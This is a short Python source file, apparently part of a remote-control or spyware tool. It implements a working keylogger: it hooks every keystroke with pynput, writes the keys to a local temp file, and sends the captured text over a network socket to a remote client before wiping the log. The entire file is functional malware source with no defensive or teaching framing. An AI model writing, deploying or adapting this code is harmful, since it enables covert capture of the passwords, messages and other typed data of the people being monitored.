from pynput import keyboard
import threading
import config
import os

script_dir = os.path.dirname(__file__)
filePath = os.path.join(script_dir, "tempData/keylogger.txt")

def on_key_press(key):
    if not(config.hook) : return False
    with open(filePath, "a") as fi:
        try:
            if key.char == None: return
            fi.write(key.char)
            print(key.char)
        except AttributeError:
            fi.write(f'||{str(key)}||')
            print(key)

# Set up the listener
def hook():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def sendKeyLogger(clientsocket):
    keylogger_content = ""
    with open(filePath, "r+") as fi:
        keylogger_content = fi.read()
        if len(keylogger_content) == 0 :
            clientsocket.send("0".encode())
            return
        fi.seek(0)
        fi.truncate()
    clientsocket.send("1".encode())
    clientsocket.send(keylogger_content.encode())

def startedKeyLogger():
    config.hook = True
    keylogger_thread = threading.Thread(target = hook)
    keylogger_thread.start()